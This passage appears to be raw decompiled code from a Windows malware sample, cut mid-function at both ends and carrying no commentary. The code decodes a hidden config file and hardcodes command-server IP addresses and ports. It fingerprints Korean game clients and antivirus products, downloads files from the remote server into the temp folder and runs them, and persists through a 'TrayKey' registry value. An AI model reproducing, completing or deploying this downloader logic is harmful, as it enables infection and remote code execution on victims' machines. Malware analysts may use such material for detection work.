  else if ((param_2 == 0x111) && ((param_3 == 1 || (param_3 == 2)))) {
    EndDialog(param_1,(uint)param_3);
    uVar1 = 1;
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}



void FUN_004014a0(void)

{
  short sVar1;
  short *local_20c;
  short *local_208;
  short *local_1fc;
  short *local_1f8;
  short *local_1ec;
  short *local_1e8;
  short local_1e4;
  undefined local_1e2 [62];
  HANDLE local_1a4;
  int local_1a0;
  undefined local_19c [404];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_1e4 = 0;
  _memset(local_1e2,0,0x3e);
  local_1a0 = 0;
  local_1a4 = (HANDLE)0x0;
  Ordinal_115(0x101,local_19c);
  local_1a0 = FUN_004024c0((int *)&DAT_00418880);
  if (local_1a0 == 0) {
    local_1e8 = &DAT_004145a4;
    local_1ec = &DAT_00418a28;
    do {
      sVar1 = *local_1e8;
      *local_1ec = sVar1;
      local_1e8 = local_1e8 + 1;
      local_1ec = local_1ec + 1;
    } while (sVar1 != 0);
    FUN_00402450((wchar_t *)&DAT_00418884,u_218_54_28_139_004145b0);
    FUN_00402470(&DAT_00418906,u_AAAA_004145cc);
    FUN_00402450((wchar_t *)&DAT_00418926,u_121_88_5_183_004145d8);
    DAT_00418904 = 0x51;
    DAT_004189a6 = 0x2b70;
    local_1f8 = &DAT_004145f4;
    local_1fc = &DAT_00418a08;
    do {
      sVar1 = *local_1f8;
      *local_1fc = sVar1;
      local_1f8 = local_1f8 + 1;
      local_1fc = local_1fc + 1;
    } while (sVar1 != 0);
    DAT_00418a48 = 5;
  }
  FUN_00404430();
  FUN_00404390();
  local_208 = &local_1e4;
  local_20c = &DAT_00417eb0;
  do {
    sVar1 = *local_208;
    *local_20c = sVar1;
    local_208 = local_208 + 1;
    local_20c = local_20c + 1;
  } while (sVar1 != 0);
  local_1a4 = OpenEventW(0x20000,0,&DAT_00417eb0);
  if (local_1a4 == (HANDLE)0x0) {
    local_1a4 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&DAT_00417eb0);
    if (local_1a4 != (HANDLE)0x0) {
      DAT_00418748 = FUN_004044e0(u_121_88_5_183_00414604);
      FUN_00401760(&DAT_00418a80);
      CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00402300,(LPVOID)0x0,0,(LPDWORD)0x0);
    }
  }
  else {
    CloseHandle(local_1a4);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00401760(undefined4 *param_1)

{
  short sVar1;
  int iVar2;
  short *local_e4;
  short *local_e0;
  short *local_d4;
  short *local_d0;
  undefined local_cc [74];
  undefined4 local_82;
  undefined2 local_7e;
  undefined4 local_7c;
  short local_74 [38];
  undefined2 local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_28 = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  _memset(local_cc,0,0xa0);
  _memset(param_1,0,0x200);
  iVar2 = FUN_00404790();
  if (iVar2 != 0) {
    DAT_0041846c = FUN_00401ab0();
    *param_1 = DAT_0041846c;
    param_1[1] = (uint)DAT_00418653 * 0x1000000 + (uint)DAT_00418652 * 0x10000 +
                 (uint)DAT_00418651 * 0x100 + (uint)DAT_00418650;
    param_1[2] = DAT_00416f34;
    param_1[3] = local_7c;
    param_1[4] = local_82;
    *(undefined2 *)(param_1 + 5) = local_7e;
    local_d0 = local_74;
    local_d4 = (short *)((int)param_1 + 0x16);
    do {
      sVar1 = *local_d0;
      *local_d4 = sVar1;
      local_d0 = local_d0 + 1;
      local_d4 = local_d4 + 1;
    } while (sVar1 != 0);
    FUN_00401970((short *)((int)param_1 + 0x96),DAT_00416f10);
    *(uint *)((int)param_1 + 0x196) = DAT_0041874e;
    *(undefined4 *)((int)param_1 + 0x19a) = DAT_00418752;
    local_e0 = &DAT_00418756;
    local_e4 = (short *)((int)param_1 + 0x19e);
    do {
      sVar1 = *local_e0;
      *local_e4 = sVar1;
      local_e0 = local_e0 + 1;
      local_e4 = local_e4 + 1;
    } while (sVar1 != 0);
    FUN_00403f00(DAT_0041874e);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00401970(short *param_1,int param_2)

{
  short sVar1;
  wchar_t wVar2;
  wchar_t *local_40;
  wchar_t *local_3c;
  wchar_t *local_30;
  wchar_t *local_2c;
  short *local_20;
  short *local_1c;
  wchar_t *local_10;
  wchar_t *local_c;
  
  if (param_2 == 3) {
    local_1c = &DAT_00414634;
    local_20 = param_1;
    do {
      sVar1 = *local_1c;
      *local_20 = sVar1;
      local_1c = local_1c + 1;
      local_20 = local_20 + 1;
    } while (sVar1 != 0);
  }
  else if (param_2 == 4) {
    local_2c = u_WinVista_00414640;
    local_30 = param_1;
    do {
      wVar2 = *local_2c;
      *local_30 = wVar2;
      local_2c = local_2c + 1;
      local_30 = local_30 + 1;
    } while (wVar2 != L'\0');
  }
  else if (param_2 == 5) {
    local_c = u_WinSeven_00414620;
    local_10 = param_1;
    do {
      wVar2 = *local_c;
      *local_10 = wVar2;
      local_c = local_c + 1;
      local_10 = local_10 + 1;
    } while (wVar2 != L'\0');
  }
  else {
    local_3c = u_UnKnown_00414654;
    local_40 = param_1;
    do {
      wVar2 = *local_3c;
      *local_40 = wVar2;
      local_3c = local_3c + 1;
      local_40 = local_40 + 1;
    } while (wVar2 != L'\0');
  }
  return;
}



void FUN_00401ab0(void)

{
  DWORD DVar1;
  uint uVar2;
  WCHAR local_41c;
  undefined local_41a [2];
  undefined2 local_418;
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  uVar2 = 0;
  local_41c = L'\0';
  _memset(local_41a,0,0x206);
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  GetSystemWindowsDirectoryW(&local_41c,0x104);
  local_418 = 0;
  wsprintfW(&local_214,u__s_s_00414664,&local_41c,u__Hangame_KOREAN_HanUninstall_exe_00414670,uVar2)
  ;
  DVar1 = GetFileAttributesW(&local_214);
  if (DVar1 != 0xffffffff) {
    uVar2 = uVar2 | 1;
  }
  wsprintfW(&local_214,u__s_s_004146b4,&local_41c,u__NEOWIZ_PMang_common_PMLauncher__004146c0,uVar2)
  ;
  DVar1 = GetFileAttributesW(&local_214);
  if (DVar1 != 0xffffffff) {
    uVar2 = uVar2 | 2;
  }
  wsprintfW(&local_214,u__s_s_00414754,&local_41c,u__Netmarble_Common_NetMarbleEndWe_00414708,uVar2)
  ;
  DVar1 = GetFileAttributesW(&local_214);
  if (DVar1 != 0xffffffff) {
    uVar2 = uVar2 | 4;
  }
  wsprintfW(&local_214,u__s_s_004147b4,&local_41c,u__Program_Files_AhnLab_V3Lite30_V_00414760,uVar2)
  ;
  DVar1 = GetFileAttributesW(&local_214);
  if (DVar1 != 0xffffffff) {
    uVar2 = uVar2 | 0x100;
  }
  wsprintfW(&local_214,u__s_s_00414814,&local_41c,u__Program_Files_ESTsoft_ALYac_AYL_004147c0,uVar2)
  ;
  DVar1 = GetFileAttributesW(&local_214);
  if (DVar1 != 0xffffffff) {
    uVar2 = uVar2 | 0x200;
  }
  wsprintfW(&local_214,u__s_s_00414880,&local_41c,u__Program_Files_naver_NaverAgent__00414820,uVar2)
  ;
  GetFileAttributesW(&local_214);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401ce0(void)

{
  WCHAR WVar1;
  short *psVar2;
  LSTATUS LVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  WCHAR *local_358;
  WCHAR *local_34c;
  WCHAR *local_348;
  WCHAR *local_33c;
  WCHAR *local_338;
  short *local_328;
  short *local_318;
  undefined4 local_314 [26];
  undefined local_2aa [98];
  DWORD local_248;
  HANDLE local_244;
  DWORD local_240;
  WCHAR local_23c;
  undefined local_23a [518];
  HKEY local_34;
  WCHAR local_30;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_23c = L'\0';
  _memset(local_23a,0,0x206);
  local_244 = (HANDLE)0x0;
  local_240 = 0;
  local_248 = 0x104;
  local_30 = L'\0';
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_318 = &DAT_00418a08;
  psVar2 = local_318;
  do {
    local_318 = psVar2;
    psVar2 = local_318 + 1;
  } while (*local_318 != 0);
  if (((int)(local_318 + -0x20c504) >> 1 == 0) ||
     (local_244 = OpenEventW(0x20000,0,&DAT_00418a08), local_244 == (HANDLE)0x0)) {
    LVar3 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_004148a8,0,0xf003f,
                          &local_34);
    if (LVar3 == 0) {
      LVar3 = RegQueryValueExW(local_34,u_TrayKey_0041488c,(LPDWORD)0x0,&local_240,(LPBYTE)&local_30
                               ,&local_248);
      if ((LVar3 == 0) && (local_244 = OpenEventW(0x20000,0,&local_30), local_244 != (HANDLE)0x0)) {
        RegCloseKey(local_34);
        goto LAB_004020c2;
      }
      RegCloseKey(local_34);
    }
    GetTempPathW(0x104,&local_23c);
    local_328 = &DAT_00418a08;
    psVar2 = local_328;
    do {
      local_328 = psVar2;
      psVar2 = local_328 + 1;
    } while (*local_328 != 0);
    if ((int)(local_328 + -0x20c504) >> 1 == 0) {
      FUN_00402490(&DAT_00418c80,u__s_exe_00414914);
      local_338 = &DAT_00414924;
      local_33c = &local_30;
      do {
        WVar1 = *local_338;
        *local_33c = WVar1;
        local_338 = local_338 + 1;
        local_33c = local_33c + 1;
      } while (WVar1 != L'\0');
    }
    else {
      FUN_00402490(&DAT_00418c80,u__s_exe_00414930);
      local_348 = &DAT_00418a08;
      local_34c = &local_30;
      do {
        WVar1 = *local_348;
        *local_34c = WVar1;
        local_348 = local_348 + 1;
        local_34c = local_34c + 1;
      } while (WVar1 != L'\0');
    }
    _wcscat_s(&local_23c,0x104,&DAT_00418c80);
    iVar4 = FUN_004020e0();
    if (iVar4 == 0) {
      Sleep(100);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_23c,(LPCWSTR)&DAT_00414940,(LPCWSTR)0x0,1);
      puVar5 = (undefined4 *)u_Software_Microsoft_Windows_NT_Cu_00414958;
      puVar6 = local_314;
      for (iVar4 = 0x1a; iVar4 != 0; iVar4 = iVar4 + -1) {
        *puVar6 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar6 = puVar6 + 1;
      }
      *(undefined2 *)puVar6 = *(undefined2 *)puVar5;
      _memset(local_2aa,0,0x5e);
      LVar3 = RegOpenKeyExW((HKEY)0x80000001,(LPCWSTR)local_314,0,3,&local_34);
      if (LVar3 == 0) {
        local_358 = &local_30;
        do {
          WVar1 = *local_358;
          local_358 = local_358 + 1;
        } while (WVar1 != L'\0');
        LVar3 = RegSetValueExW(local_34,u_TrayKey_00414944,0,1,(BYTE *)&local_30,
                               ((int)local_358 - (int)&local_2e >> 1) * 2 + 2);
        if (LVar3 == 0) {
          RegCloseKey(local_34);
        }
      }
    }
  }
LAB_004020c2:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 FUN_004020e0(void)

{
  undefined4 local_8;
  
  if (DAT_00416f10 == 3) {
    local_8 = FUN_00402130(s_121_88_5_184_004149c4,0x2b66);
  }
  else {
    local_8 = FUN_00402130(s_121_88_5_184_004149d4,0x2b70);
  }
  return local_8;
}



void __cdecl FUN_00402130(undefined4 param_1,ushort param_2)

{
  int iVar1;
  int local_428;
  int local_424;
  WCHAR local_41c;
  undefined local_41a [518];
  wchar_t local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  iVar1 = FUN_00404ae0(param_1,(uint)param_2);
  if (iVar1 == 0) {
    local_41c = L'\0';
    _memset(local_41a,0,0x206);
    local_214 = L'\0';
    _memset(local_212,0,0x206);
    GetTempPathW(0x104,&local_41c);
    for (local_424 = 0; local_424 < 5; local_424 = local_424 + 1) {
      if ((&DAT_00417ef0)[local_424 * 0x8c] != 0) {
        _wcscpy_s(&local_214,0x104,&local_41c);
        _wcscat_s(&local_214,0x104,&DAT_00417ef0 + local_424 * 0x8c);
      }
    }
    for (local_428 = 0; local_428 < 5; local_428 = local_428 + 1) {
      if ((&DAT_00417ef0)[local_428 * 0x8c] != 0) {
        FUN_004053f0(&DAT_00417ef0 + local_428 * 0x8c,param_1,(uint)param_2,1);
      }
    }
    _wcscat_s(&local_41c,0x104,&DAT_00418c80);
    GetFileAttributesW(&local_41c);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402300(void)

{
  WCHAR WVar1;
  undefined4 *puVar2;
  undefined4 *local_220;
  WCHAR *local_214;
  undefined local_210 [4];
  WCHAR local_20c;
  undefined auStack_20a [510];
  uint local_c;
  HANDLE local_8;
  
  local_c = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_20c = DAT_00414954;
  _memset(auStack_20a,0,0x1fe);
  local_210 = (undefined  [4])&DAT_00417eb0;
  local_214 = &local_20c;
  do {
    WVar1 = *(WCHAR *)local_210;
    *local_214 = WVar1;
    local_210 = (undefined  [4])((int)local_210 + 2);
    local_214 = local_214 + 1;
  } while (WVar1 != L'\0');
  puVar2 = (undefined4 *)(local_210 + 2);
  do {
    local_220 = puVar2;
    puVar2 = (undefined4 *)((int)local_220 + 2);
  } while (*(short *)((int)local_220 + 2) != 0);
  *(undefined4 *)((int)local_220 + 2) = u__STOP_004149e4._0_4_;
  *(undefined4 *)((int)local_220 + 6) = u__STOP_004149e4._4_4_;
  *(undefined4 *)((int)local_220 + 10) = u__STOP_004149e4._8_4_;
  local_8 = (HANDLE)0x0;
  while (local_8 == (HANDLE)0x0) {
    local_8 = OpenEventW(0x20000,0,&local_20c);
    Sleep(200);
  }
  CloseHandle(local_8);
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void __cdecl FUN_00402450(wchar_t *param_1,wchar_t *param_2)

{
  _wcscpy_s(param_1,0x40,param_2);
  return;
}



void __cdecl FUN_00402470(wchar_t *param_1,wchar_t *param_2)

{
  _wcscpy_s(param_1,0x10,param_2);
  return;
}



void __cdecl FUN_00402490(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x104,param_2,&stack0x0000000c);
  return;
}



void __cdecl FUN_004024c0(int *param_1)

{
  int iVar1;
  int *piVar2;
  uint local_218;
  int local_20c [128];
  uint local_c;
  int local_8;
  
  local_c = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_8 = 0x504d534d;
  _memset(local_20c,0,0x200);
  iVar1 = FUN_004025c0(local_20c,0x200,u_golfinfo_ini_004143cc,1);
  if (iVar1 != 0) {
    for (local_218 = 0; local_218 < 0x200; local_218 = local_218 + 1) {
      *(byte *)((int)local_20c + local_218) = ~*(byte *)((int)local_20c + local_218);
    }
    if (local_20c[0] == local_8) {
      piVar2 = local_20c;
      for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {
        *param_1 = *piVar2;
        piVar2 = piVar2 + 1;
        param_1 = param_1 + 1;
      }
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_004025c0(void *param_1,size_t param_2,wchar_t *param_3,int param_4)

{
  wchar_t wVar1;
  wchar_t *local_21c;
  WCHAR local_214;
  undefined local_212 [518];
  uint local_c;
  FILE *local_8;
  
  local_c = DAT_00416048 ^ (uint)&stack0xfffffffc;
  if (((param_1 != (void *)0x0) && (param_2 != 0)) && (param_3 != (wchar_t *)0x0)) {
    local_21c = param_3;
    do {
      wVar1 = *local_21c;
      local_21c = local_21c + 1;
    } while (wVar1 != L'\0');
    if ((int)local_21c - (int)(param_3 + 1) >> 1 != 0) {
      local_214 = L'\0';
      _memset(local_212,0,0x206);
      if (param_4 == 0) {
        if (DAT_00416f10 == 3) {
          GetSystemDirectoryW(&local_214,0x104);
          _wcscat_s(&local_214,0x104,(wchar_t *)&DAT_004143e8);
        }
        else {
          GetTempPathW(0x104,&local_214);
        }
      }
      else {
        GetTempPathW(0x104,&local_214);
      }
      _wcscat_s(&local_214,0x104,param_3);
      local_8 = (FILE *)0x0;
      __wfopen_s(&local_8,&local_214,(wchar_t *)&DAT_004143ec);
      if (local_8 != (FILE *)0x0) {
        _fread(param_1,param_2,1,local_8);
        _fclose(local_8);
      }
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402760(int *param_1)

{
  int iVar1;
  int *piVar2;
  uint local_214;
  int local_20c [128];
  uint local_c;
  int local_8;
  
  local_c = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_8 = 0x504d534d;
  _memset(local_20c,0,0x200);
  iVar1 = FUN_004025c0(local_20c,0x200,u_golfset_ini_004143f4,0);
  if (iVar1 != 0) {
    for (local_214 = 0; local_214 < 0x200; local_214 = local_214 + 1) {
      *(byte *)((int)local_20c + local_214) = ~*(byte *)((int)local_20c + local_214);
    }
    if (local_20c[0] == local_8) {
      piVar2 = local_20c;
      for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {
        *param_1 = *piVar2;
        piVar2 = piVar2 + 1;
        param_1 = param_1 + 1;
      }
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402850(int *param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  uint local_214;
  int local_20c [128];
  uint local_c;
  int local_8;
  
  local_c = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_8 = 0x504d534d;
  piVar2 = param_1;
  piVar3 = local_20c;
  for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {
    *piVar3 = *piVar2;
    piVar2 = piVar2 + 1;
    piVar3 = piVar3 + 1;
  }
  if (*param_1 == local_8) {
    for (local_214 = 0; local_214 < 0x200; local_214 = local_214 + 1) {
      *(byte *)((int)local_20c + local_214) = ~*(byte *)((int)local_20c + local_214);
    }
    FUN_00402910(local_20c,0x200);
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00402910(void *param_1,size_t param_2)

{
  WCHAR local_214;
  undefined local_212 [518];
  uint local_c;
  FILE *local_8;
  
  local_c = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_8 = (FILE *)0x0;
  if ((param_1 != (void *)0x0) && (param_2 != 0)) {
    GetTempPathW(0x104,&local_214);
    _wcscat_s(&local_214,0x104,u_golfinfo_ini_0041440c);
    __wfopen_s(&local_8,&local_214,(wchar_t *)&DAT_00414428);
    if (local_8 != (FILE *)0x0) {
      _fwrite(param_1,param_2,1,local_8);
      _fclose(local_8);
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004029f0(void)

{
  wchar_t wVar1;
  WCHAR WVar2;
  short *psVar3;
  HANDLE pvVar4;
  DWORD DVar5;
  LSTATUS LVar6;
  WCHAR *local_698;
  short *local_688;
  short *local_678;
  wchar_t *local_66c;
  wchar_t *local_668;
  wchar_t *local_65c;
  wchar_t *local_658;
  wchar_t *local_64c;
  wchar_t *local_648;
  wchar_t *local_63c;
  wchar_t *local_638;
  WCHAR local_634;
  undefined local_632 [522];
  HKEY local_428;
  WCHAR local_424;
  undefined local_422 [518];
  int local_21c;
  wchar_t local_218 [64];
  short local_198;
  wchar_t local_196 [16];
  wchar_t local_176 [64];
  undefined2 local_f6;
  wchar_t local_94 [16];
  wchar_t local_74 [16];
  int local_54;
  undefined4 local_50;
  uint local_18;
  int local_14;
  int local_10;
  void *local_c;
  int local_8;
  
  local_18 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_14 = 0;
  local_8 = 0;
  local_10 = 0;
  local_424 = L'\0';
  _memset(local_422,0,0x206);
  local_634 = L'\0';
  _memset(local_632,0,0x206);
  GetTempPathW(0x104,&local_424);
  _wcscat_s(&local_424,0x104,u_HGDraw_dll_00414430);
  DeleteFileW(&local_424);
  local_8 = FUN_00402ff0();
  if ((DAT_00418640 != 1) || (local_8 != 0)) {
    local_10 = FUN_00403610();
    _memset(&local_21c,0,0x200);
    local_21c = 0x504d534d;
    local_198 = 0x51;
    local_f6 = 0x2b70;
    local_638 = &DAT_00414448;
    local_63c = local_176;
    do {
      wVar1 = *local_638;
      *local_63c = wVar1;
      local_638 = local_638 + 1;
      local_63c = local_63c + 1;
    } while (wVar1 != L'\0');
    local_648 = &DAT_00414464;
    local_64c = local_218;
    do {
      wVar1 = *local_648;
      *local_64c = wVar1;
      local_648 = local_648 + 1;
      local_64c = local_64c + 1;
    } while (wVar1 != L'\0');
    local_658 = &DAT_00414480;
    local_65c = local_196;
    do {
      wVar1 = *local_658;
      *local_65c = wVar1;
      local_658 = local_658 + 1;
      local_65c = local_65c + 1;
    } while (wVar1 != L'\0');
    local_54 = 5;
    _wcscpy_s(local_94,0x10,&DAT_00418600);
    if ((local_8 != 0) || (local_10 != 0)) {
      FUN_00402470(local_196,&DAT_00418470);
      FUN_00402450(local_218,&DAT_004184f0);
      FUN_00402450(local_176,&DAT_00418578);
      local_198 = DAT_00418570;
      local_f6 = DAT_004185f8;
      local_54 = DAT_004185fc;
      if (DAT_004185fc == 0) {
        local_54 = 5;
      }
    }
    local_668 = &DAT_0041448c;
    local_66c = local_176;
    do {
      wVar1 = *local_668;
      *local_66c = wVar1;
      local_668 = local_668 + 1;
      local_66c = local_66c + 1;
    } while (wVar1 != L'\0');
    if ((local_218[0] != L'\0') && (local_198 != 0)) {
      local_21c = 0x504d534d;
      local_678 = &DAT_00418600;
      psVar3 = local_678;
      do {
        local_678 = psVar3;
        psVar3 = local_678 + 1;
      } while (*local_678 != 0);
      if (((int)(local_678 + -0x20c300) >> 1 != 0) &&
         (pvVar4 = OpenEventW(0x20000,0,&DAT_00418600), pvVar4 != (HANDLE)0x0)) {
        _wcscpy_s(local_94,0x10,&DAT_00418600);
      }
      if (local_94[0] == L'\0') {
        FUN_00402470(local_94,u_hoyr_004144a8);
      }
      if (local_74[0] == L'\0') {
        FUN_00402470(local_74,u_poldge_004144b4);
        local_688 = &DAT_00418620;
        psVar3 = local_688;
        do {
          local_688 = psVar3;
          psVar3 = local_688 + 1;
        } while (*local_688 != 0);
        if ((int)(local_688 + -0x20c310) >> 1 != 0) {
          FUN_00402470(local_74,&DAT_00418620);
        }
      }
      local_50 = DAT_00416f34;
      if (local_54 == 0) {
        local_54 = 5;
      }
      local_14 = FUN_00402850(&local_21c);
      if (local_14 != 0) {
        FUN_00403910();
        GetModuleFileNameW((HMODULE)0x0,&local_634,0x104);
        DVar5 = GetTickCount();
        local_c = (void *)(((ulonglong)DVar5 / 1000) % 100);
        FUN_00403fc0(local_c,&local_424);
        local_428 = (HKEY)0x0;
        LVar6 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_004144d0,0,3,
                              &local_428);
        if (LVar6 == 0) {
          local_698 = &local_424;
          do {
            WVar2 = *local_698;
            local_698 = local_698 + 1;
          } while (WVar2 != L'\0');
          LVar6 = RegSetValueExW(local_428,(LPCWSTR)&DAT_004144c4,0,1,(BYTE *)&local_424,
                                 ((int)local_698 - (int)local_422 >> 1) * 2 + 2);
          if (LVar6 == 0) {
            RegCloseKey(local_428);
          }
        }
        ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_424,(LPCWSTR)&DAT_004144cc,(LPCWSTR)0x0,1);
      }
    }
    local_14 = 1;
  }
  ___security_check_cookie_4(local_18 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00402ff0(void)

{
  wchar_t wVar1;
  short sVar2;
  undefined4 *puVar3;
  int iVar4;
  short *local_b4c;
  short *local_b48;
  short *local_b3c;
  short *local_b38;
  short *local_b2c;
  short *local_b28;
  short *local_b1c;
  short *local_b18;
  undefined4 *local_b10;
  wchar_t *local_b04;
  wchar_t *local_b00;
  wchar_t *local_af4;
  wchar_t *local_af0;
  undefined local_aec [8];
  undefined4 local_ae4;
  uint local_9ec;
  undefined2 local_9e8;
  uint local_9e6;
  undefined2 local_9e2;
  short local_9de [16];
  wchar_t local_9be [16];
  wchar_t local_99e [119];
  int local_8b0;
  wchar_t local_8ac;
  undefined local_8aa [66];
  undefined local_868 [4];
  wchar_t local_864;
  undefined auStack_862 [62];
  WCHAR local_824;
  undefined local_822 [518];
  undefined2 local_61c;
  undefined local_61a [518];
  WCHAR local_414;
  undefined local_412 [518];
  int local_20c;
  short local_208 [64];
  undefined2 local_188;
  short local_186 [16];
  short local_166 [64];
  undefined2 local_e6;
  wchar_t local_84 [16];
  wchar_t local_64 [16];
  undefined4 local_44;
  uint local_c;
  undefined4 local_8;
  
  local_c = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_414 = L'\0';
  _memset(local_412,0,0x206);
  local_824 = L'\0';
  _memset(local_822,0,0x206);
  local_61c = 0;
  _memset(local_61a,0,0x206);
  local_8 = 0;
  _memset(&local_20c,0,0x200);
  GetModuleFileNameW((HMODULE)0x0,&local_824,0x104);
  iVar4 = FUN_004024c0(&local_20c);
  if (iVar4 == 0) {
    _memset(local_aec,0,0x236);
    iVar4 = FUN_00403bc0();
    if (iVar4 != 0) {
      local_b48 = local_9de;
      local_b4c = &DAT_00418470;
      do {
        sVar2 = *local_b48;
        *local_b4c = sVar2;
        local_b48 = local_b48 + 1;
        local_b4c = local_b4c + 1;
      } while (sVar2 != 0);
      DAT_00418570 = local_9e2;
      DAT_004185f8 = local_9e8;
      FUN_00403f00(local_9e6);
      FUN_00403f00(local_9ec);
      _wcscpy_s(&DAT_00418620,0x10,local_9be);
      _wcscpy_s(&DAT_00418600,0x10,local_99e);
      DAT_004185fc = local_ae4;
      local_8 = 1;
    }
  }
  else {
    GetTempPathW(0x104,&local_414);
    _wcscat_s(&local_414,0x104,local_84);
    _wcscat_s(&local_414,0x104,u__exe_0041453c);
    DeleteFileW(&local_414);
    _wcscpy_s(&DAT_00418620,0x10,local_64);
    FUN_00403910();
    iVar4 = FUN_004039b0();
    if (iVar4 == 1) {
      DAT_00418640 = 1;
    }
    else {
      local_8ac = L'\0';
      _memset(local_8aa,0,0x3e);
      local_864 = L'\0';
      _memset(auStack_862,0,0x3e);
      local_868 = (undefined  [4])0x0;
      local_af0 = local_64;
      local_af4 = &local_8ac;
      do {
        wVar1 = *local_af0;
        *local_af4 = wVar1;
        local_af0 = local_af0 + 1;
        local_af4 = local_af4 + 1;
      } while (wVar1 != L'\0');
      local_b00 = local_64;
      local_b04 = &local_864;
      do {
        wVar1 = *local_b00;
        *local_b04 = wVar1;
        local_b00 = local_b00 + 1;
        local_b04 = local_b04 + 1;
      } while (wVar1 != L'\0');
      puVar3 = (undefined4 *)(local_868 + 2);
      do {
        local_b10 = puVar3;
        puVar3 = (undefined4 *)((int)local_b10 + 2);
      } while (*(short *)((int)local_b10 + 2) != 0);
      *(undefined4 *)((int)local_b10 + 2) = u__STOP_00414548._0_4_;
      *(undefined4 *)((int)local_b10 + 6) = u__STOP_00414548._4_4_;
      *(undefined4 *)((int)local_b10 + 10) = u__STOP_00414548._8_4_;
      local_868 = (undefined  [4])OpenEventW(0x20000,0,&local_8ac);
      if (local_868 != (undefined  [4])0x0) {
        CloseHandle((HANDLE)local_868);
        local_868 = (undefined  [4])CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&local_864);
        local_8b0 = 0;
        while ((local_868 = (undefined  [4])OpenEventW(0x20000,0,&local_8ac),
               local_868 != (undefined  [4])0x0 && (local_8b0 < 5))) {
          CloseHandle((HANDLE)local_868);
          local_8b0 = local_8b0 + 1;
          Sleep(500);
        }
      }
      Sleep(1000);
      DeleteFileW(&local_414);
      local_b18 = local_208;
      local_b1c = &DAT_004184f0;
      do {
        sVar2 = *local_b18;
        *local_b1c = sVar2;
        local_b18 = local_b18 + 1;
        local_b1c = local_b1c + 1;
      } while (sVar2 != 0);
      local_b28 = local_186;
      local_b2c = &DAT_00418470;
      do {
        sVar2 = *local_b28;
        *local_b2c = sVar2;
        local_b28 = local_b28 + 1;
        local_b2c = local_b2c + 1;
      } while (sVar2 != 0);
      local_b38 = local_166;
      local_b3c = &DAT_00418578;
      do {
        sVar2 = *local_b38;
        *local_b3c = sVar2;
        local_b38 = local_b38 + 1;
        local_b3c = local_b3c + 1;
      } while (sVar2 != 0);
      DAT_00418570 = local_188;
      DAT_004185f8 = local_e6;
      DAT_004185fc = local_44;
      _wcscpy_s(&DAT_00418600,0x10,local_84);
      local_8 = 1;
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403610(void)

{
  short sVar1;
  int iVar2;
  short *local_43c;
  short *local_438;
  short *local_42c;
  short *local_428;
  short *local_41c;
  short *local_418;
  int local_414;
  short local_410 [64];
  undefined2 local_390;
